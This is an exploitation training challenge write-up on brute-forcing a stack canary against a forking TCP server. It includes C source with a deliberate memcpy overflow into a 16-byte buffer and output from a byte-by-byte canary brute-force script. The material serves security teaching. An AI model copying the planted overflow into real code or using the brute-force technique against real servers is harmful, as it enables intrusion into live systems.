# Stack canary brute force


## Introduction

Stack canary protect the saved instruction pointer (SIP) on the stack
from an stack based overflow. But fork() networked servers allow byte-per-byte
brute-force of the stack canary. In this challenge we will implement such a
brute-force program.

## Goal

* Implement a stack canary bruteforcer
* Get our static and dynamic analysis skills to the next level


## Source

```c
#include <stdio.h>
#include <string.h> /* memset() */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <netdb.h>

#define PORT    "32001" /* Port to listen on */
#define BACKLOG     10  /* Passed to listen() */

/* Signal handler to reap zombie processes */
static void wait_for_child(int sig)
{
    while (waitpid(-1, NULL, WNOHANG) > 0);
}


void handleData(char *data, int len) {
	char buf[16];
	memcpy(buf, data, len);
	printf("Received: %i bytes\n", len);
}

void handle(int newsock)
{
	char buf[128];
	int ret;
	while( (ret = read(newsock, buf, 128)) > 0) {
		handleData(buf, ret);
		printf ("Send: OK\n");
		send(newsock, "ok", 2, 0);
	}
}

int main(void)
{
    int sock;
    struct sigaction sa;
    struct addrinfo hints, *res;
    int reuseaddr = 1; /* True */

    /* Get the address info */
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(NULL, PORT, &hints, &res) != 0) {
        perror("getaddrinfo");
        return 1;
    }

    /* Create the socket */
    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    /* Enable the socket to reuse the address */
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuseaddr, sizeof(int)) == -1) {
        perror("setsockopt");
        return 1;
    }

    /* Bind to the address */
    if (bind(sock, res->ai_addr, res->ai_addrlen) == -1) {
        perror("bind");
        return 1;
    }

    /* Listen */
    if (listen(sock, BACKLOG) == -1) {
        perror("listen");
        return 1;
    }

    freeaddrinfo(res);

    /* Set up the signal handler */
    sa.sa_handler = wait_for_child;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        return 1;
    }

    printf("Listening to port: %s\n", PORT);

    /* Main loop */
    while (1) {
        struct sockaddr_in their_addr;
        socklen_t size = sizeof(struct sockaddr_in);
        int newsock = accept(sock, (struct sockaddr*)&their_addr, &size);
        int pid;

        if (newsock == -1) {
            perror("accept");
            return 0;
        }

        printf("Got a connection from %s on port %d\n", inet_ntoa(their_addr.sin_addr),
                        htons(their_addr.sin_port));

        pid = fork();
        if (pid == 0) {
            /* In child process */
            close(sock);
            handle(newsock);
            return 0;
        }
        else {
            /* Parent process */
            if (pid == -1) {
                perror("fork");
                return 1;
            }
            else {
                close(newsock);
            }
        }
    }

    close(sock);

    return 0;
}
```

## Server behaviour

The server listens on port 32001, and will `fork()` for every new connection:
```
while (1) {
		...
		int newsock = accept(sock, (struct sockaddr*)&their_addr, &size);
		...
		pid = fork();
		if (pid == 0) {
				/* In child process */
				close(sock);
				handle(newsock);
				return 0;
		}
```

The server will receive up to 128 bytes of data in `handle()`. It will then
copy this into a 16 byte buffer in the function `handleData` by using `memcpy()`:

```
void handleData(char *data, int len) {
	char buf[16];
	memcpy(buf, data, len);
	printf("Received: %i bytes\n", len);
}

void handle(int newsock)
{
	char buf[128];
	int ret;
	while( (ret = read(newsock, buf, 128)) > 0) {
		handleData(buf, ret);
		printf ("Send: OK\n");
		send(newsock, "ok", 2, 0);
	}
}
```

## Normal behaviour

Lets start the server:

```
root@hlUbuntu64:~/challenges/challenge14# ./challenge14-server
Listening to port: 32001
```

Lets send a small amount of data :

```
root@hlUbuntu64:~/challenges/challenge14# nc localhost 32001
AAAABBBB
ok
```

We sent `AAAABBBB`, and the server answered with `ok`. Note that the connection is still
open, netcat did not exist, and we could send more data.

The server will output:
```
Got a connection from 127.0.0.1 on port 57728
Received: 9 bytes
Send: OK
```

## Overflow

Lets send some more data this time:
```
root@hlUbuntu64:~/challenges/challenge14# nc localhost 32001
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@hlUbuntu64:~/challenges/challenge14#
```

As we see, netcat exited after sending the long string. What did the server output:
```
Got a connection from 127.0.0.1 on port 57730
Received: 52 bytes
*** stack smashing detected ***: ./challenge14-server terminated
```

We compiled the server with enabled stack canary, and it does detect the stack corruption.


## Exploit

A sample exploit is provided in the file `challenge14-bruteforce.py`. When started it has the
following output:

```
root@hlUbuntu64:~/challenges/challenge14# ./challenge14-bruteforce.py
Send 16: AAAAAAAAAAAAAAAA
Send 17: AAAAAAAAAAAAAAAAA
Send 18: AAAAAAAAAAAAAAAAAA
Send 19: AAAAAAAAAAAAAAAAAAA
Send 20: AAAAAAAAAAAAAAAAAAAA
Send 21: AAAAAAAAAAAAAAAAAAAAA
Send 22: AAAAAAAAAAAAAAAAAAAAAA
Send 23: AAAAAAAAAAAAAAAAAAAAAAA
Send 24: AAAAAAAAAAAAAAAAAAAAAAAA
Send 25: AAAAAAAAAAAAAAAAAAAAAAAAA
Crash of server at offset: 25
Offset is: 24
Found byte: 0x0
Found byte: 0x19
Found byte: 0x8b
Found byte: 0xd0
Found byte: 0x33
Found byte: 0xcc
Found byte: 0x2b
Found byte: 0xaf
Found byte: 0x0
Found byte: 0x0
Found byte: 0xfe
Found byte: 0xff
Found byte: 0xff
Found byte: 0x7f
Found byte: 0x0
Found byte: 0x0
Found byte: 0x22
Found byte: 0xc
Found byte: 0x40
Found byte: 0x0
Found byte: 0x0
Found byte: 0x0
Found byte: 0x0
^C
Bytes:
0x0 0x19 0x8b 0xd0 0x33 0xcc 0x2b 0xaf 0x0 0x0 0xfe 0xff 0xff 0x7f 0x0 0x0 0x22 0xc 0x40 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
...
```

The script detects the crash of the server (connection is terminated).

First it will send as many bytes as needed until the server crashes to find the offset.

Afterwards, it will iterate through all bytes to see with which bytes the server does
not crash. A byte of 0x0 usually indicates that the server does not care what the content
of the byte is exactly.
